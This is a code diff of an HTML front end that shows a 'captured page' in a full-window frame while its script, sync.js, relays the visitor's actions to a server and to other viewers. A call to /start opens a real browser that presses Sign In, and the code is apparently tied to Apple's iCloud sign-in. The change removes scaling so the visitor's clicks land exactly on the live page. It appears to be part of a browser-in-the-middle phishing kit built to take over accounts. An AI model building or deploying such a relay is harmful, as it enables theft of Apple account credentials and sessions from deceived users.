@@ -7,17 +7,16 @@
 <style>
   html, body { height:100%; margin:0; background:#000; }
 
-  /* The captured page, loaded as a document of its own. It is laid out at
-   * the size it was captured at and scaled down to fit the window, so the
-   * page in the mirror is the page that was captured - the same content
-   * squeezed into a different width puts every click in the wrong place. */
+  /* The captured page, loaded as a document of its own. It fills the window:
+   * scaling it to fit would put every click somewhere other than where it was
+   * clicked, and the point now is to use the page, not to look at it. */
   #remote {
-    position:absolute; top:0; left:0;
+    position:fixed; inset:0;
+    width:100%; height:100%;
     border:0; display:block; background:#fff;
-    transform-origin: 0 0;
   }
 
-  /* Sits on top of the mirror until the mirror has something to show. */
+  /* Sits on top until the captured page has loaded. */
   #overlay {
     position:fixed; inset:0; z-index:10;
     display:flex; align-items:center; justify-content:center;
@@ -33,99 +32,38 @@
   }
   @keyframes spin { to { transform:rotate(360deg); } }
 
-  .icon { display:flex; animation:fade .3s ease-in; }
-  @keyframes fade { from { opacity:0; } to { opacity:1; } }
-
-  /* Errors are shown by colour only, never with text. */
-  .icon.failed svg { fill:#ff453a; }
-
   [hidden] { display:none !important; }
 </style>
 </head>
 <body>
-  <iframe id="remote" src="/1.html" title="Remote browser"></iframe>
+  <!-- The already-captured page. src/1.html is served with /sync.js in it,
+       which is what carries what you do in here to the server and out to
+       every other viewer. -->
+  <iframe id="remote" src="/src/1.html" title="Captured page"></iframe>
 
   <div id="overlay">
-    <div class="spinner" id="spinner"></div>
-    <div class="icon" id="icon" hidden>
-      <svg width="64" height="64" viewBox="0 0 24 24" fill="#fff" aria-label="Apple">
-        <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 5.98-3.74 4.25z"/>
-      </svg>
-    </div>
+    <div class="spinner"></div>
   </div>
 
 <script>
   const remote = document.getElementById("remote");
   const overlay = document.getElementById("overlay");
-  const spinner = document.getElementById("spinner");
-  const icon = document.getElementById("icon");
 
-  // Visiting the page starts the browser.
-  fetch("/start").catch(() => {});
+  // Visiting the page still opens the real browser and presses Sign In, so
+  // the user can sign in there. Nothing is captured from it any more: the
+  // page above is the capture.
+  fetch("/start")
+    .then((r) => r.json())
+    .then((s) => {
+      if (s.status === "error") console.warn("[icloud] browser:", s.error);
+    })
+    .catch(() => {});
 
-  let seeded = false;
-  let timer = null;
-
-  function show(state) {
-    if (seeded) return;
-    spinner.hidden = state !== "wait";
-    icon.hidden = state === "wait";
-    icon.classList.toggle("failed", state === "error");
-  }
-
-  /* Lay the captured page out at the size it was captured at, and scale it
-   * down to fit the window. The page inside keeps its own viewport, so a
-   * click in the mirror is in the same place on the page as it is on the
-   * real thing. */
-  let fitted = { w: 0, h: 0, scale: 1 };
-
-  function fit(w, h) {
-    if (!w || !h) return;
-    const availW = window.innerWidth;
-    const availH = window.innerHeight;
-    const scale = Math.min(availW / w, availH / h) || 1;
-    fitted = { w: w, h: h, scale: scale };
-    remote.style.width = w + "px";
-    remote.style.height = h + "px";
-    const x = (availW - w * scale) / 2;
-    const y = (availH - h * scale) / 2;
-    remote.style.transform = "translate(" + x + "px," + y + "px) scale(" + scale + ")";
-  }
-
-  // The mirror says so when it has a real document to show, and tells us
-  // how big that document was captured at.
-  window.addEventListener("message", (ev) => {
-    if (ev.source !== remote.contentWindow) return;
-    const data = ev.data || {};
-    if (data.rb === "seeded") {
-      seeded = true;
-      clearInterval(timer);
-      overlay.hidden = true;
-    } else if (data.rb === "size") {
-      fit(data.w, data.h);
-    }
+  // The engine inside the iframe talks to /ws on its own; the parent only
+  // gets out of the way once there is a document to look at.
+  remote.addEventListener("load", () => {
+    overlay.hidden = true;
   });
-
-  // Until then, /status decides whether to keep spinning or show the mark.
-  function poll() {
-    fetch("/status")
-      .then((r) => r.json())
-      .then((s) => {
-        if (s.status === "error") show("error");
-        else if (s.browser_open) show("icon");
-        else show("wait");
-      })
-      .catch(() => {});
-  }
-
-  /* The size the captured page was laid out at, and how far it is scaled
-   * down to fit the window. A test reads it to work out where a click on
-   * the mirror lands on the page. */
-  window.mirrorMetrics = () => fitted;
-
-  show("wait");
-  poll();
-  timer = setInterval(poll, 700);
 </script>
 </body>
 </html>
